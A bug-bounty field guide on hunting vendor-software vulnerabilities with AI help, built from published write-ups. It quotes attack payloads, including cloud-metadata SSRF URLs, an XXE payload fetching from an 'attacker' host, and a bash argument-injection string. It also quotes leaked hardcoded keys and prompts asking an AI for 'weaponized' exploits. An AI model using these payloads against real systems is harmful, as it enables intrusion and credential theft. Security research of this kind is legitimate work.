# The 0-Day & N-Day Hunter's Field Book
### A practical playbook for a full-time bug bounty hunter who teams up with AI

> Built from the full Assetnote research corpus (~78 posts on assetnote.io/resources/research).
> Written for **someone who hunts every day, knows the web well, but isn't a deep code-reader** — your superpower is **delegating the heavy lifting to an AI partner** (Claude, GPT, etc.) and making sharp judgement calls.

---

## How to use this book

- Read **Part I** once. It's the worldview.
- **Part II** is the workflow — return to it every hunt.
- **Part III** is your bug-class playbook. Skim it; deep-read whichever class matches your current target.
- **Part IV** are the **AI prompts you copy-paste** when you find source code, a binary, or a patch. This is the secret weapon.
- **Part V** is targets, tooling, and a daily routine.

If a section says *"Ask the AI"*, that's literally the move — paste the code/binary diff/error and let your AI partner translate it into bug language.

---

# PART I — The Worldview

## Chapter 1. Who actually finds 0-days, and why you can too

The Assetnote crew (Shubham Shah, Adam Kues, Adam Crosser, Dylan Pindur, Max Garrett, etc.) publishes ~20 critical CVEs a year against multi-billion-dollar vendors: **Citrix, Ivanti, FortiGate, VMware, Sitecore, Oracle, Magento, Atlassian, ServiceNow, Cloudflare, Next.js**. Reading 70+ of their writeups, the pattern is shockingly repetitive:

1. They pick **gated, expensive enterprise software** that almost nobody else audits.
2. They get the **source code or binary** by any legal means (trial, leak, decompile, firmware extract).
3. They **grep for dangerous functions** (deserialize, eval, exec, file_get_contents…).
4. They **trace backwards** to an unauthenticated endpoint.
5. They **patch-diff** when a vendor releases a fix to find the bug from the patch.
6. They **scan the internet** to monetize at scale.

> **None of these steps require you to be a 10x coder.** They require *patience*, *taste in targets*, *pattern recognition*, and an *AI partner* who can read code at superhuman speed.

### Your unfair advantage as the AI-collaborating hunter
- You don't need to read 200,000 lines of Java. You give the AI a JAR and a prompt.
- You don't need to write a ROP chain. You hand the AI a binary diff and ask "what changed and where's the input boundary".
- You **do** need to: (a) spot which targets are juicy, (b) generate hypotheses, (c) verify in Burp, (d) write the report.

This is the same delta as a 1990s journalist vs. one with Google. The hunter who treats AI as a **junior reverse-engineer + intern source-code grep** wins.

---

## Chapter 2. 0-day vs N-day — pick your lane

| | **N-day** | **0-day** |
|---|---|---|
| **What** | Public CVE, patched, but unpatched in the wild | New, undisclosed bug |
| **Time-to-cash** | Hours to days (race the patch window) | Weeks to months |
| **Skill needed** | Read the advisory, build the PoC, scan | Read source/binary, find the bug yourself |
| **AI helps with** | Reproducing PoC, scaling scans, fingerprinting versions | Reading code, patch diffing, generating payloads |
| **Bug-bounty fit** | Programs that test "your CVE detection" — also panic-bounties after disclosure | Vendor programs (Microsoft, Apple, Zoom, GitLab), bug-bounty residual on customers |

**Recommendation for a full-timer:** ride **N-days for monthly cash flow**, build **0-day muscle on the side** for spike payouts ($25k–$250k).

### The N-day cash loop
1. Subscribe to: Assetnote, watchTowr, ProjectDiscovery, GreyNoise, GitHub Security Lab, ZDI, Wiz, Orange Tsai. Set RSS or use a daily AI-summary cron.
2. The moment a new pre-auth RCE drops on a CISA-known vendor, **race**:
   - Reproduce PoC in a local container/VM (AI helps build the lab).
   - Build a benign fingerprint check (version banner, error oracle, behavioral diff).
   - httpx + nuclei across all your bug-bounty scopes, filter for vulnerable versions.
   - Submit. Cite the CVE.
3. Public bug-bounty programs **pay** for "you found my unpatched Citrix" — even though it's an N-day. This is *not* cheating; it's reconnaissance value.

---

## Chapter 3. The 10 commandments of vendor-software hunting

1. **Boring software is the goldmine.** WebSphere, WhatsUp Gold, Aspera, Avaya, Yellowfin BI — these are unsexy, costly, internet-exposed, *and* underaudited. That's the trifecta.
2. **Get the source, always.** Trial download, evaluation key, GitHub leak, firmware extract, APK pull.
3. **Pre-auth or it's not interesting.** A post-auth RCE chained with open registration / SSRF / leaked token *becomes* pre-auth. Always look for the chain.
4. **Encryption ≠ Authentication.** A static-key encrypted parameter is not a security boundary. It's an obfuscation layer.
5. **Two systems looking at the same path = path confusion.** Nginx + Apache, F5 + IIS, CDN + origin. Always test double-encoding, fragments, dot-segments, semicolons.
6. **Order of operations bugs are everywhere.** Sanitize→decode→validate must be in the right sequence. One swapped step = bypass.
7. **Patches are exploit roadmaps.** When a vendor adds a length check, an `if`, an `@AuthorizationRequired`, or output encoding — that's where the bug *is*.
8. **Setup wizards are RCE in disguise.** `/setup`, `/install`, install-tokens left in `/api/session/properties`, `Action=createadministrator`. Always test.
9. **Continuous monitoring beats genius.** New subdomain → new vendor → new attack surface. Run httpx + nuclei + new-CVE templates on your scopes every day.
10. **Document everything.** A scattered notes folder won't cash checks. One `~/Documents/Brain/` per target. Ask your AI to summarize at end of session.

---

# PART II — The Hunting Workflow

## Chapter 4. The Loop (run this every hunt)

```
┌─────────────────────────────────────────────────────────────┐
│  1. PICK    →  vendor software, gated, costly, exposed      │
│  2. ACQUIRE →  trial / decompile / firmware / GitHub leak   │
│  3. MAP     →  routes, controllers, [Anonymous] / @Path     │
│  4. SINK    →  grep dangerous APIs (Part IV prompts)        │
│  5. TRACE   →  source → sink, find unauth path              │
│  6. DIFF    →  if N-day: bindiff patched vs unpatched       │
│  7. PoC     →  minimal request, then weaponize              │
│  8. SCALE   →  scan all scopes, fingerprint, validate       │
│  9. REPORT  →  reproduce, screenshot, impact, mitigations   │
└─────────────────────────────────────────────────────────────┘
```

### 4.1 Picking a target
**Green flags:**
- Costs >$10k/yr per seat (no security researcher buys a license).
- Self-hosted, on-prem, internet-facing.
- Java/.NET stack with reflection/deserialization (Sitecore, MOVEit, Citrix).
- "Enterprise gateway / VPN / proxy / file-transfer" category (Citrix, Ivanti, Fortinet, MOVEit, ShareFile, Aspera).
- Last published CVE was >12 months ago (means underaudited *or* well-maintained — find out which).
- Has a Shodan/Censys footprint of >5k internet-exposed instances.

**Red flags:**
- Already covered by 5 published 2025 advisories (saturated; race window closed).
- SaaS-only (you can't pull binaries).
- Tiny user base (<1k installs) — bounty payout < effort.

### 4.2 Acquiring code (legal, every time)
| Source | How |
|---|---|
| Vendor trial | Free 30-day download, register a corp email |
| Container image | `docker pull vendor/product`, then `docker save \| tar -x` |
| Firmware | Download appliance image, extract with binwalk / 7z; mount LUKS if needed |
| APK / iOS bundle | Pull from Play / IPA decrypt; `unzip` |
| Public GitHub | Sometimes vendors leak — search `org:vendor filename:web.config validationKey` |
| Customer leak | Researchers occasionally upload — check VirusTotal, archive.org |
| Patch RPM / MSI | Extract with `rpm2cpio`, `7z x`, `msiextract` |

**Always within ToS / legal scope.** Bug-bounty contracts usually allow reverse-engineering of the running service; binary acquisition rules vary — read the program brief.

### 4.3 Mapping the attack surface (AI-assisted)
Once you have the code, the goal is a list of **every endpoint reachable without authentication**.

For Java: find `web.xml`, `@Path`, `@RequestMapping`, `@WebServlet`, `WebSecurityConfig`.
For .NET: find `RouteConfig.cs`, `[Route]`, `[AllowAnonymous]`, `web.config <authorization>`.
For PHP: routes file (Laravel `routes/web.php`, Symfony `routing.yaml`), or `.htaccess` rewrites.
For Python: `urls.py`, `app.route`, FastAPI `@router`.
For Ruby: `config/routes.rb`.

> **AI prompt template (use this):**
>
> *"Here is the codebase root. List every HTTP endpoint that does NOT require authentication. Group by controller. For each, list (a) HTTP method, (b) path, (c) parameters accepted, (d) any obvious dangerous sinks called (deserialize, eval, exec, file ops). Output as a markdown table sorted by perceived risk."*

### 4.4 Sink hunting — the core skill
A **sink** is a function where attacker-controlled data turns into damage. Memorize this list. When grepping/AI-asking, point at these.

| Class | Sinks (any language) |
|---|---|
| Deserialization | `BinaryFormatter.Deserialize`, `NetDataContractSerializer.ReadObject`, `ObjectInputStream.readObject`, `YAML.load`, `pickle.loads`, `unserialize`, `Marshal.load` |
| Code eval | `eval`, `exec`, `Runtime.exec`, `ProcessBuilder.start`, `Process.Start`, `subprocess.* shell=True`, `popen`, `system`, `Function()` (JS), `Kernel.eval` |
| SQL/HQL | `entityManager.createQuery`, raw SQL string concat, `db.exec`, `prepare(...$_GET)` |
| File | `file_get_contents`, `fopen`, `Files.readAllBytes`, `MapPath`, `include`, `require`, `Server.MapPath`, `Path.Combine` w/ user input |
| Network/SSRF | `HttpClient`, `URL.openConnection`, `requests.get`, `WebRequest.Create`, `URI.create(base+input)` |
| Template / SSTI | `Jelly`, `Twig`, `Jinja2`, `Velocity`, `Freemarker`, `Smarty`, `AMPScript`, `Liquid`, `Handlebars` |
| XML | `DocumentBuilder` w/o secure flags, `SimpleXMLElement(... LIBXML_NOENT)`, `XMLReader`, `xmlParseDoc` |
| Crypto auth | `MAC`-less `Decrypt`, `signature.verify` skipped, hardcoded keys |

### 4.5 The patch-diff move (N-days)
1. Vendor publishes 13.1-49.15. Get **49.15** AND the previous **48.47**.
2. Extract both. For .NET → ILSpy decompile both. For C/C++ → Ghidra both, run BinDiff.
3. Look for **added length checks, added `if`, added authorization, added escaping**.
4. The function with the new `if` is your bug. The condition tells you the input range that triggers it.

> **Real example:** Citrix Bleed CVE-2023-4966 was found by spotting a single added bounds-check in `ns_aaa_oauth_send_openid_config()`. The input was `Host:` header. Time from patch to PoC: <1 day for the trained team.

### 4.6 PoC discipline
- **Smallest possible request.** Strip cookies, headers, params until it fails. The minimal trigger is the truth.
- **Idempotent.** No persistence, no destruction. Burp Repeater, not Intruder.
- **Reproducible from a fresh container.** If you can `docker run` and PoC in 60 seconds, you've nailed it.
- **Out-of-band proof for blind bugs:** Burp Collaborator / interactsh.

### 4.7 Scaling
- httpx for status/title/tech.
- nuclei templates (write your own once you have a fingerprint — AI can convert your curl into a nuclei YAML).
- Distinguish **vulnerable** vs **just-this-version** with an error oracle (one response for patched, another for unpatched).

### 4.8 Reporting
Every Assetnote post is also a template:
1. Vulnerability summary (1 paragraph).
2. Affected versions.
3. Root cause (with code snippet).
4. Reproduction steps (curl).
5. Impact.
6. Mitigation / patch reference.
7. Timeline.

Use that structure. Programs love it.

---

# PART III — The Bug-Class Bestiary

Every chapter follows the same 6-part structure: **Concept → Where it hides → Discovery prompt for AI → Exploitation → Real Assetnote case → Your hunting checklist**.

---

## Chapter 5. Insecure Deserialization (the #1 Assetnote moneymaker)

### Concept
A program turns bytes back into objects. If the byte-stream is attacker-controlled and the language allows arbitrary type instantiation, you get RCE via "gadget chains" — pre-existing code in the app's libraries, abused.

### Where it hides
- File upload handlers (the Sitecore Telerik bug, WS_FTP CVE-2023-40044).
- View state / session cookies (.NET `__VIEWSTATE` with leaked machineKey).
- HTTP modules (`MyFileUpload.UploadModule`).
- Custom RPC/SOAP endpoints (.NET `.rem` files).
- File comments fields (MOVEit — yes, the *comments* of an upload).
- Deeply-nested JSON that hits `SimpleXMLElement` via reflection (Magento XXE).

### AI prompt
> *"Scan this codebase for any of: BinaryFormatter.Deserialize, NetDataContractSerializer.ReadObject, ObjectInputStream.readObject, YAML.load (without safe_load), pickle.loads, unserialize, Marshal.load. For each hit, trace backwards to find what HTTP path delivers the input. List unauthenticated paths first."*

### Exploitation
- .NET: **ysoserial.net** with chains like `TypeConfuseDelegate`, `ActivitySurrogateSelector`. For `BinaryFormatter`: any chain works. For `NetDataContractSerializer`: same.
- Java: **ysoserial** (CommonsCollections, Spring, BeanShell, ROME, etc.).
- Ruby YAML: ysoserial-equivalent (`Gem::Installer` chain).
- PHP: **phpggc**.
- Python pickle: write your own `__reduce__`.

### Real case — WS_FTP CVE-2023-40044
- HTTP module `MyFileUpload.UploadModule` runs *before* auth.
- Multipart upload, base64 in a field with no `filename` parameter, `BinaryFormatter.Deserialize` is called on it.
- ysoserial.net `--gadget=TypeConfuseDelegate --formatter=BinaryFormatter --command="cmd /c whoami"` → RCE.

### Checklist
- [ ] Did I grep every deser function across the codebase?
- [ ] For each, did I find the HTTP entry point?
- [ ] Is auth applied *before* the deser call, or after?
- [ ] If after — does ysoserial give RCE?
- [ ] Do I have machineKey from web.config (ViewState attack)?

---

## Chapter 6. Server-Side Request Forgery (SSRF)

### Concept
The server fetches a URL on your behalf. You point it at internal targets: cloud metadata, Redis, internal admin panels, intranet HTTP services.

### Where it hides
- Image proxies, avatar uploaders ("upload by URL").
- Webhook configurators.
- OAuth/SAML callbacks (RetrievalMethod XML elements).
- "Health check" admin endpoints.
- PDF/HTML renderers (Headless Chrome, wkhtmltopdf).
- URL shorteners.
- Anywhere `Host:` / `X-Forwarded-*` headers reach a server-side `fetch()`.

### AI prompt
> *"Find every place this codebase makes an outbound HTTP request (HttpClient, requests.get, file_get_contents on URL, URL.openConnection, WebRequest.Create). For each, identify whether the destination URL is built from user input — including request headers like Host or X-Forwarded-Proto. Flag dangerous patterns like `URI.create(base + userInput)` or `\"https://\" + hostname + path`."*

### Exploitation menu
| Goal | Payload |
|---|---|
| Cloud creds | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| GCP creds | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (header `Metadata-Flavor: Google`) |
| Redis RCE | `gopher://internal:6379/_*3%0d%0a$3%0d%0aSET...` (Gopherus generates) |
| Bypass filter | `http://attacker@target`, `http://target.evil.com`, `http://[::1]`, `http://127.1`, `http://0` |
| Force-redirect | Whitelisted host that 302s to anywhere (Lotus Domino `?Logout&RedirectTo=`) |

### Real case — VMware Workspace ONE UEM CVE-2021-22054
- `BlobHandler.ashx` decrypts a URL with a *hardcoded* AES key.
- Researcher decompiled, found the key, encrypted `http://169.254.169.254/...`, base64'd it, sent.
- Got AWS creds in response.
- **Lesson: when an endpoint takes an "encrypted parameter", ask the AI to find the decryption key in the binary.**

### Checklist
- [ ] Tested all `url=`, `fetch=`, `imageUrl=`, `redirect=`, `target=`, `next=`, `callback=` params with `@`-trick + collaborator.
- [ ] Tried Host header injection on every page (the Next.js / VMware / Workspace One trick).
- [ ] Tested OAuth / SAML callback URLs.
- [ ] Probed cloud metadata.
- [ ] If got DNS callback only, escalated to gopher://, dict://, file://.

---

## Chapter 7. Path / Authentication Bypass via Path Confusion

### Concept
Two systems disagree on what a URL means. The proxy thinks "/admin/" needs auth, but the backend interprets the URL differently after re-decoding/rewriting.

### Where it hides
- Nginx → Apache, F5 → IIS, CDN → origin, AWS ALB → Tomcat.
- Anywhere there's a `proxy_pass` + a backend that does its own normalization.
- IIS `Server.Execute()` (re-dispatches without re-checking auth).

### AI prompt
> *"Show me how requests are routed in this product. Is there a reverse proxy (nginx/apache/IIS) plus an application server? For the proxy config, list every authentication rule. For the backend, list the URL rewrite rules. Identify any URL that the proxy treats as 'unauth' but the backend rewrites to a privileged path."*

### The classic tricks
- `%2e%2e/` (single-encoded), `%252e%252e/` (double-encoded).
- `/admin/..;/public/` (Java semicolon param).
- `/public/..%5c..%5cadmin/` (backslash on Windows).
- `?f=secret#.js` — fragment stripped after extension check (Sitecore).
- Trailing dot, trailing space, `/admin/.` → behaves differently.
- Header tricks: `X-pan-AuthCheck: off`, `X-Original-URL`, `X-Rewrite-URL`.

### Real case — PAN-OS CVE-2025-0108
- Nginx checks "is this `/unauth/` ?" → yes → no auth needed.
- Apache rewrites `/unauth/%252e%252e/php/ztp_gate.php/PAN_help/x.css` → after double-decode → `/php/ztp_gate.php` (a privileged endpoint).
- The `X-pan-AuthCheck: off` header (set by nginx for `/unauth/`) is preserved through the rewrite.
- → Pre-auth admin command execution.

### Checklist
- [ ] Sent `%2e%2e/`, `%252e%252e/`, `..;/`, `..\`, fragment tricks at every protected endpoint.
- [ ] Mapped which proxy is in front and what its rules say.
- [ ] Tested header-based auth toggles.

---

## Chapter 8. Memory Corruption (don't be afraid — AI helps)

### Concept
Native code (C/C++) writes outside a buffer. If the layout is right, you redirect execution.

### Why a non-coder can still find these
- **Patch diff tells you the bug.** Bindiff highlights the new bounds check. The function name + the parameter that's now checked = your input.
- **Fuzzing crashes are obvious.** AFL/libfuzzer/Boofuzz against the binary; a SIGSEGV is your starting line.
- **AI translates assembly to "what does this do".**

### AI prompt
> *"Here are two versions of `nsppe` (decompiled in Ghidra, exported as C). Diff function-by-function. Highlight any function where the patched version added a length check, a NULL check, or a bounds comparison. For each, explain what input parameter was previously unchecked, and how a remote attacker would deliver oversized input."*

### The recurring root causes
- `snprintf` return value used as bytes-written (Citrix Bleed) → over-read.
- `strcat` with attacker-controlled string into fixed buffer (WatchGuard) → heap overflow.
- Length field from network parsed without ceiling (FortiGate, Citrix RDP).
- Stack buffer with `strcpy` (Citrix NetScaler 3519).

### Real case — Citrix Bleed CVE-2023-4966
- Endpoint: `/oauth/idp/.well-known/openid-configuration`.
- Input: `Host:` header, 24,812 bytes of `a`.
- Result: response leaks 24KB of heap → session cookies of other users.
- **No exploit dev needed. Just a giant Host header and `grep -a 'sessid'` in the response.** This is the kind of "memory corruption" a non-coder can cash.

### Checklist
- [ ] When a vendor patches, did I bindiff?
- [ ] Did I ask AI for "what's the smallest input that triggers the new check"?
- [ ] Did I try giant-header / giant-param fuzzing on every pre-auth endpoint?

---

## Chapter 9. Order-of-Operations Bugs

### Concept
Validate-decode-decrypt-parse must be in the right order. Get one swap wrong and a payload sneaks through.

### Patterns to spot
- Sanitize **before** decode → encoded payload bypasses sanitizer.
- Validate extension **before** strip-fragment → `?f=secret%23.js` reads `secret`.
- Decrypt **after** sanitize → encrypted payload is unsanitized.
- `&&` where `||` was meant → setup wizard re-runnable.
- Check signature **after** parsing XML → XXE in the signed-but-not-verified portion.

### AI prompt
> *"In this controller, list the sequence of operations applied to user input: parsing, decoding, decryption, sanitization, validation, dispatch. For each operation, tell me: does it operate on the raw bytes, the decoded form, or the decrypted form? Highlight any case where validation is performed before a transformation that could change the input's meaning."*

### Real case — Oracle Opera CVE-2023-21932
- `FileReceiver` endpoint sanitizes `username` for path-traversal characters.
- Then decrypts `username`.
- Attacker submits an *encrypted* path traversal — sanitization saw cipher-text, decryption produces `../../../`, file uploaded to webroot. RCE.

### Checklist
- [ ] Asked AI for the operation sequence on every user input.
- [ ] Tested encoded payloads vs raw payloads at every endpoint.
- [ ] Tested whether install/setup endpoints can be re-triggered.

---

## Chapter 10. Hardcoded Secrets / Default Keys

### Concept
The vendor ships the same private key, JWT secret, encryption key, or API token in every install. You extract it once and forge admin tokens forever.

### AI prompt
> *"Search the entire codebase + decompiled binaries for: hex strings 32+ chars, base64 strings 40+ chars, anything labelled 'secret', 'key', 'salt', 'password', 'token', 'machineKey', 'validationKey', 'decryptionKey', 'BEGIN PRIVATE KEY', 'BEGIN RSA'. List file path, line, surrounding code, and probable purpose."*

### Exploit moves
- **JWT secret** → forge admin JWT (`{"role":"admin"}`).
- **MachineKey** in .NET → ViewState RCE (`ysoserial.net -p ViewState`).
- **AES key** → decrypt-then-replay/forge encrypted parameters.
- **API token** → call internal admin APIs.

### Real cases
- **Yellowfin BI**: 3 hardcoded keys — RSA, AES, JWT — all separate CVEs, all RCE.
- **VMware Workspace ONE UEM**: `5c5e2c554f4f644b54383127495b356d7b36714e4b214a6967492657290123a0` literally in the DLL.
- **SolarWinds WHD**: hardcoded credential `helpdesk91114AD77B4CDCD9E18771057190C08B:1A11E431...` in JSP.

---

## Chapter 11. Argument & Command Injection

### Concept
User input ends up in a shell command, a process arg list, or a CI logging command.

### Patterns
- `subprocess.Popen(cmd_string, shell=True)` with concatenation.
- `Runtime.getRuntime().exec(string)` with concat (note: Java `exec(String)` splits on spaces — different escaping than `exec(String[])`).
- **Null-byte split** in `NuProcessBuilder` (Bitbucket) — `%00--exec=...`.
- Azure DevOps logging command injection — `##vso[task.setvariable]`.
- Argument injection via leading `-` in filename / param (e.g., `-oProxyCommand=...` to `git`/`ssh`).

### AI prompt
> *"Find all subprocess / shell / exec calls. For each, show what arguments are passed. Flag any that pass strings (not lists) or use shell=True or concatenate user input."*

### Real case — Bitbucket CVE-2022-36804
- `/archive` endpoint takes a `prefix=` param.
- Internally calls `git archive` via NuProcessBuilder (which splits args on null bytes).
- `prefix=x%00--exec=/bin/bash+-c+'id'%00--remote=file:///%00x` → injects `--exec` flag → RCE.

---

## Chapter 12. Server-Side Template Injection / Eval

### Concept
A template engine processes user input as code.

### Engines to recognize
- AMPScript (Salesforce Marketing Cloud) — `%%[ ]%%` and `LookupRows`.
- Jelly (ServiceNow) — `<j:jelly>`, `${}`, `$[]`.
- Twig (Symfony, Craft, Drupal 8+) — `{{ }}`.
- Jinja2 (Flask) — `{{ }}`.
- Velocity, Freemarker (Java).
- Liquid (Shopify, Jekyll).
- Handlebars / Mustache.
- ERB (Rails).
- Smarty, Mako (PHP/Python).

### AI prompt
> *"Identify the template engine(s) in this codebase. For each render call, identify whether user input reaches the template body (not just the variables). For each render, list the sandboxing/escaping configuration. Suggest engine-specific RCE payloads."*

### Detection canaries (paste in any field)
- `${7*7}` `{{7*7}}` `<%= 7*7 %>` `#{7*7}` `[[${7*7}]]`
- If you see `49` in the response → SSTI.
- For blind: payloads that trigger DNS via OOB.

### Real case — Uber AMPScript ($23k)
- Internal exposed endpoint accepted AMPScript.
- `LookupRows("driver_partners","first_name","x")` → returned everyone's UUID/email.
- Discovery: continuous subdomain monitoring caught a new exposed test interface.

---

## Chapter 13. File Upload, Path Traversal, ZIP Slip, Race

### Patterns
- `filename="../../../webapps/ROOT/x.jsp"` in multipart.
- ZIP entries with `../` paths (ZIP slip).
- **Race**: extract → cleanup; you race to access before cleanup (WebPageTest Mozilla).
- Upload extension whitelist bypassed by double extension (`x.jsp.png`), null byte (`x.jsp%00.png`), case (`x.JsP`), parser quirk (Apache mod_php with `x.php.evil`).

### AI prompt
> *"Find every multipart upload handler. For each, show: how the filename is derived, where the file is written, what extensions are allowed, and whether path components in the filename are normalized. Flag any that allow `../` or write under web root."*

---

## Chapter 14. XXE & Nested Deserialization

### Concept
XML parser fetches external entities. Or: a "JSON" deserializer recursively instantiates classes including `SimpleXMLElement`.

### Where it hides (less obvious)
- SAML responses.
- DOCX/XLSX/SVG uploads (zipped XML inside).
- SOAP endpoints.
- Magento-style nested-JSON-into-constructors.

### AI prompt
> *"Find every XML parsing call. For each, show whether DTD processing, external entity resolution, and parameter entities are disabled. List the configuration flags. Then find every JSON deserializer that does dynamic class instantiation; identify whether SimpleXMLElement / DocumentBuilder / similar XML classes are reachable."*

### Payload (classic)
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker/x.dtd"> %xxe; ]>
```

---

## Chapter 15. Setup / Install Wizard Re-trigger

Always test, on every product:
- `/setup`, `/install`, `/initial`, `/wizard`, `/admin/access/setup`, `/api/setup/*`.
- Re-trigger with: `Action=createadministrator`, `step=1`, `complete=false`.
- Look for **install tokens** that survive: Metabase left it in `/api/session/properties` after install.

---

## Chapter 16. Cloud / DNS / Asset-side bugs (the "no code" wins)

These need zero source code reading:
- **Dangling Elastic IPs / DNS zones** → claim, takeover (Ghostbuster).
- **Subdomain takeover** via Fastly / cPanel / Heroku CNAME.
- **Cloudflare / CDN cache poisoning** via header tricks.
- **Mobile bundle creds** — pull APK, `unzip`, grep `index.android.bundle` for Firebase / API keys.
- **GitHub dotfile leaks** — gitrob / trufflehog on org members' personal repos (Zendesk got owned this way).
- **Kubelet :10255** exposed from build pods (Cloudflare Pages part 3).

---

## Chapter 17. GraphQL

- Always test introspection (`{__schema{types{name}}}`).
- Errors leak schema even when introspection is off → Clairvoyance.
- Batched queries bypass per-request rate limit → BatchQL.
- CSRF: `application/x-www-form-urlencoded` body sometimes accepted.
- Field-level authorization often missing — once you see a query like `user(id:123)`, try other ids.

---

## Chapter 18. CRLF / Open Redirect / OAuth `redirect_uri`

- `%0d%0a` injection → header smuggling → cache poisoning → XSS.
- Suffix-only domain match (`endswith("trusted.com")` matches `eviltrusted.com`).
- Wildcard `*.visualstudio.com` matched a takeover-able subdomain → full account takeover.

---

# PART IV — AI Prompt Library (Copy-Paste-Win)

These are battle-ready prompts. Replace `{paste}` with the artifact.

## 4.1 First-pass code map
```
You are reverse-engineering a vendor security product to find unauthenticated
remote vulnerabilities legally for a bug bounty program. The codebase is below.

Tasks (output as markdown):
1. Detect the language(s) and framework(s).
2. List every HTTP routing config file (web.xml, RouteConfig, urls.py, routes.rb,
   .htaccess, nginx.conf, etc.). Quote the most relevant lines.
3. Build a table of every endpoint that does NOT require authentication. Columns:
   method | path | controller/handler | parameters | dangerous-sinks-called.
4. Sort the table with the riskiest endpoints first (those that touch
   deserialization, eval, exec, file ops, URL fetch, raw SQL).
5. For the top 5, show the source-to-sink path with file:line references.

{paste codebase listing or repo tree}
```

## 4.2 Sink-grep across a codebase
```
Search this codebase for every call to any of:

  Deserialization: BinaryFormatter.Deserialize, NetDataContractSerializer.ReadObject,
                   ObjectInputStream.readObject, YAML.load, pickle.loads, unserialize
  Code eval:       eval, exec, Runtime.exec, ProcessBuilder, Process.Start,
                   subprocess(... shell=True), system, popen, Function() (JS)
  SQL:             createQuery, executeQuery with raw concat, db.query(string+...)
  File:            file_get_contents, fopen, MapPath, include, require with var
  Network:         HttpClient, URI.create, URL.openConnection, requests.get,
                   WebRequest.Create
  XML:             DocumentBuilder w/o secure config, SimpleXMLElement
  Crypto:          decrypt without MAC, hardcoded key constants

For every hit: file path, line, surrounding 5 lines, taint analysis ("can
user input reach this argument?"), unauthenticated entry point if any.
Output as a markdown table.
```

## 4.3 Patch diff analyser (N-day generator)
```
Below are two versions of {component} — one vulnerable ({old version}) and one
patched ({new version}). For each function that differs:

1. Summarize what changed in plain English.
2. Classify the change: added validation? added auth? added bounds check?
   added escaping? removed dangerous call? rate limit? logging only?
3. For real security fixes, hypothesize the original vulnerability:
   - What input parameter/header was previously unsafe?
   - What would the smallest exploit request look like (curl)?
   - What's the impact (RCE / SSRF / auth bypass / DoS / disclosure)?
4. Rank functions by exploitability.

{paste decompiled-old vs decompiled-new}
```

## 4.4 Decompiled binary triage
```
Here is the Ghidra C export of a function from a {appliance/router/firewall}
binary. Explain in plain English:
1. What this function does (network parser? auth check? URL handler?)
2. What inputs it takes and where they come from (HTTP body? header? query?)
3. Any operations on length/size fields — is each one bounds-checked?
4. Any string operations (strcpy, strcat, sprintf, memcpy with user length)?
5. Does it call any dangerous downstream function?
6. Hypothesize a vulnerability and the trigger input.

{paste decompiled C}
```

## 4.5 Hardcoded-secret hunt
```
Scan this codebase for hardcoded secrets. Search for:
- Hex strings 32+ characters
- Base64 strings 40+ characters
- Variables named *Key, *Secret, *Token, *Password, *Salt, machineKey,
  validationKey, decryptionKey, jwtSecret, apiKey
- "BEGIN RSA", "BEGIN PRIVATE KEY", "BEGIN OPENSSH"
- AWS_, AZURE_, GCP_ credential patterns

For each hit, list:
- File path : line
- The literal value (truncated for safety if a real key)
- Probable purpose (encryption / signing / api auth / db pw)
- What an attacker can do with it (forge JWT? decrypt URL params? sign cookies?)

{paste codebase or grep results}
```

## 4.6 Endpoint-to-curl converter
```
Here is a controller method. Generate the minimal curl reproduction:
- Correct HTTP method
- All required headers (auth? content-type?)
- Body / query parameters with realistic values
- One "benign" version (read-only) and one "weaponized" version (with the
  exploit payload for the vulnerability class: {class})

{paste controller code}
```

## 4.7 Nuclei template generator
```
Convert this curl reproduction into a nuclei v3 YAML template that:
- Identifies vulnerable instances by {behavioral indicator e.g. status 500 with
  string X in response}
- Identifies patched instances by {indicator}
- Is non-destructive (read-only probe)
- Includes severity, CVE id, references

{paste curl + behavior notes}
```

## 4.8 Report writer
```
Write a bug-bounty report in Assetnote / watchTowr style with sections:
- Summary (1 paragraph)
- Affected versions
- Root cause (with code snippet from {file:line})
- Reproduction (curl)
- Impact
- Recommended fix
- Disclosure timeline placeholder

The bug is: {your finding}. Code snippet: {paste}. PoC: {paste curl + response}.
```

---

# PART V — Targets, Tooling, Routine

## Chapter 19. Target list (where the money is)

**Tier S (recurring CVE generators, costly licenses):**
Citrix NetScaler/ADC, Ivanti Pulse Connect/Connect Secure, FortiGate, Palo Alto PAN-OS, F5 BIG-IP, VMware Workspace ONE / vCenter / ESXi, Sitecore, MOVEit, Aspera Faspex, GoAnywhere, ShareFile, Confluence/Jira, Jenkins, GitLab self-hosted.

**Tier A (less covered, juicy):**
WhatsUp Gold, SolarWinds suite, Avaya Aura, Yellowfin BI, Metabase self-host, Magento, dotCMS, Craft CMS, Flarum, ServiceNow, WebSphere Portal, Lotus Domino, Oracle Opera/EBS, Dynamicweb, Telerik, Liferay.

**Tier B (mobile / cloud / framework):**
Next.js apps, Netlify functions, Cloudflare Workers/Pages, Azure DevOps configs, AWS Cognito misconfigs, Firebase rules, GraphQL endpoints, React Native bundles.

## Chapter 20. Tooling

**Static / decompile:** ILSpy, dnSpy, JetBrains dotPeek, jadx, JD-GUI, Bytecode Viewer, Procyon, CFR, Ghidra+BinDiff, IDA+Diaphora, radare2.
**Dynamic:** gdbserver, lldb, Frida, pspy, attach to JVM/IIS w3wp.
**Recon:** httpx, naabu, dnsx, subfinder, Kiterunner, IIS-ShortName-Scanner+BigQuery, Ghostbuster.
**Surface diff:** GitHub Actions cron that re-runs subfinder+httpx daily, alerts on new subdomains/ports/titles.
**Exploit gen:** ysoserial(.net), marshalsec, phpggc, Gopherus, BatchQL, Clairvoyance.
**OOB:** Burp Collaborator, interactsh, ngrok, requestbin.
**Lab:** Docker for everything; for appliances — VMware Workstation, QEMU, GNS3.

## Chapter 21. Daily routine for a full-time hunter

**Morning (~2h)** — N-day farm
- Read RSS / advisories: Assetnote, watchTowr, ProjectDiscovery, Wiz, ZDI, GitHub Security Advisories, CISA KEV updates.
- For any new pre-auth RCE on Tier-S/A vendor: drop everything, go to "race" mode (PoC → fingerprint → scan all scopes → submit).

**Midday (~3h)** — 0-day project
- Ongoing target. One per quarter. Pick from Tier A.
- Spend the time on (a) reading code with AI prompts from Part IV, (b) building lab, (c) testing hypotheses.

**Afternoon (~2h)** — automation + recon
- Run continuous monitoring. Subdomain diff. Port diff. JS bundle diff. New tech detection.
- Anything new gets a quick triage pass.

**Evening (~1h)** — reporting + study
- Write up findings. Triage notifications.
